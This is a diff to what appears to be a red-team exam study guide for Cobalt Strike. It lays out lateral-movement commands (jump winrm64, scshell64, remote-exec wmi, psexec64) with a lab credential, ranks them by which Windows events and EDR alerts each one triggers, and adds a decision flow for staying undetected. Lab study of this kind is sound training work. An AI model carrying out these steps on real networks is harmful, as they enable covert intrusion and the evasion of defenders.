@@ -624,23 +624,156 @@ Switch back to Attacker Desktop — a new beacon should check in.
 
 ### Test lateral movement with custom service spawnto
 
-Service payloads (`jump psexec64`) always default to `rundll32.exe` as the spawnto process.
-The env var `%windir%` in `post-ex.spawnto_x64` does NOT resolve in SYSTEM context (used by
-services). Override explicitly using Artifact Kit's `ak-settings` command:
+**`jump psexec64` — OPSEC-UNSAFE. Do not use this in the exam unless every other path fails.**
+
+`jump psexec64` creates a Windows service on the remote target to execute the beacon payload.
+This produces multiple high-confidence detection events simultaneously:
+
+| What it does | Detection event | Event log |
+|-------------|----------------|-----------|
+| Creates a new service on the remote host | Service Control Manager | Event ID 7045 — "A new service was installed in the system" |
+| Authenticates via SMB | Network logon | Event ID 4624 Type 3 + Event ID 4672 (if admin) |
+| Writes the service binary to disk | File write to `%SystemRoot%\` or `ADMIN$` | Sysmon Event ID 11 |
+| Default artifact is `rundll32.exe` without `ak-settings` | Suspicious service binary | Defender / EDR |
+| Service runs, then is immediately deleted | Service create+delete pair | Event ID 7045 + Event ID 7036 |
+
+**Event 7045 is an explicit OPSEC deduction in the exam scoring criteria.** Even with the
+`ak-settings` spawnto override, the service creation events still fire — you are only changing
+which executable the service runs, not preventing the service from being created.
+
+---
+
+### Lateral Movement — OPSEC Preference Order
+
+**Use the highest-OPSEC option that works. Fall down the list only if the preferred option fails.**
+
+```
+1. jump winrm64        OPSEC-SAFE      ← USE THIS FIRST
+2. jump scshell64      OPSEC-CAUTION   ← Modifies existing service — no 7045
+3. remote-exec wmi     OPSEC-CAUTION   ← No service, no 7045, but WMI process visible
+4. jump psexec64       OPSEC-UNSAFE    ← Last resort only — generates Event 7045
+```
+
+---
+
+#### Option 1 — `jump winrm64` (OPSEC-SAFE — preferred for exam)
 
 ```cs
-// First impersonate a local admin on the target:
+// Impersonate a local admin on the target first:
 beacon> make_token CONTOSO\rsteel Passw0rd!
 
-// Override spawnto for service payloads (explicit path, no env vars):
+// Move laterally via WinRM — spawns beacon inside wsmprovhost.exe (legitimate WinRM host process)
+// No service created. No Event 7045. No disk write of a service binary.
+beacon> jump winrm64 lon-ws-1 smb
+```
+
+**What happens:** CS authenticates to the WinRM service (TCP 5985) on the remote host. The
+beacon DLL is injected into `wsmprovhost.exe` — the legitimate Windows Remote Management
+provider host process. No new service. No file written to disk. Authentication shows as
+Event 4624 Type 3 (network logon) — normal for WinRM sessions.
+
+**Requirement:** WinRM must be enabled on the target (default on servers, often disabled on
+workstations). Test with `powerpick Test-WSMan <target>` from the source beacon first.
+
+---
+
+#### Option 2 — `jump scshell64` (OPSEC-CAUTION — no Event 7045)
+
+SCShell abuses an existing, already-running service by temporarily modifying its binary path
+to execute the beacon, then restoring the original path. No new service is created — no Event 7045.
+
+```cs
+// Load the SCShell aggressor script first (one-time):
+// CS → Cobalt Strike → Script Manager → Load → C:\Tools\SCShell\CS-BOF\scshell.cna
+
+// Set spawnto for the service binary payload:
 beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
 
-// Lateral move:
+// Impersonate:
+beacon> make_token CONTOSO\rsteel Passw0rd!
+
+// Move laterally:
+beacon> jump scshell64 lon-ws-1 smb
+```
+
+**What it generates:**
+- Service modification events (Event ID 7040 — service binary path changed) — less alarming than 7045
+- Beacon lands as SYSTEM inside the modified service process
+- If you see error `Advapi32$StartServiceA failed 1056` — service was already running, wait a
+  few minutes and retry (SCShell requires the service to be stopped before modification)
+
+**Why it's not SAFE:** Modifying an existing service binary path is still anomalous and visible
+to behaviour-based EDR. Quieter than psexec64 but not silent.
+
+---
+
+#### Option 3 — `remote-exec wmi` (OPSEC-CAUTION — no service, no 7045)
+
+WMI process creation via `Win32_Process.Create`. No service involved.
+
+```cs
+beacon> make_token CONTOSO\rsteel Passw0rd!
+
+// Execute a command on the remote host via WMI — no beacon spawned automatically
+// You need to stage the payload first (e.g. host an exe via CS web server)
+beacon> remote-exec wmi lon-ws-1 C:\Windows\Temp\update.exe
+```
+
+**Limitation:** `remote-exec wmi` executes a command but does not automatically link a new
+beacon back via SMB. You need the payload already on the target (uploaded separately) or
+use a PowerShell one-liner via WMI to download and execute. WMI execution is logged via
+Event ID 4688 (process creation) and WMI activity log — less noisy than a service but not silent.
+
+---
+
+#### Option 4 — `jump psexec64` (OPSEC-UNSAFE — last resort only)
+
+Only use if WinRM is disabled, SCShell fails, and WMI is blocked.
+
+```cs
+beacon> make_token CONTOSO\rsteel Passw0rd!
+
+// REQUIRED: override spawnto for service payload BEFORE running psexec
+// post-ex spawnto_x64 env vars do NOT resolve in SYSTEM service context
+beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
+
 beacon> jump psexec64 lon-ws-1 smb
 ```
 
-> `ak-settings` applies only to the Artifact Kit service payload spawnto — it does NOT affect
-> the post-ex block `spawnto_x64`. These are separate controls for separate scenarios.
+> `ak-settings` only affects the Artifact Kit service payload spawnto. It does not affect
+> the `post-ex.spawnto_x64` profile setting. These are separate controls.
+
+**What this generates — understand before using:**
+- Event 7045 on target (new service installed) → explicit OPSEC deduction
+- Event 4697 (security log) — service installed
+- Network authentication events (4624/4672)
+- File write of the service binary to `ADMIN$` share
+- Service creation + immediate deletion pair (7045 + service stop events)
+
+<img src="/images/defence-evasion-lab-07.png" width=1024>
+
+---
+
+### Lateral Movement Decision Flow (Exam Day)
+
+```
+Need to move to <target>?
+       │
+       ▼
+Test-WSMan <target> reachable?
+  YES → jump winrm64 <target> smb         ← stop here, OPSEC-SAFE
+  NO  → try scshell64
+           │
+           ▼
+        scshell64 works?
+          YES → jump scshell64 <target> smb   ← stop here, OPSEC-CAUTION
+          NO  → try remote-exec wmi
+                    │
+                    ▼
+                 WMI reachable?
+                   YES → remote-exec wmi <target> <staged payload>  ← OPSEC-CAUTION
+                   NO  → jump psexec64 <target> smb  ← LAST RESORT — accept 7045 event
+```
 
 ---
 
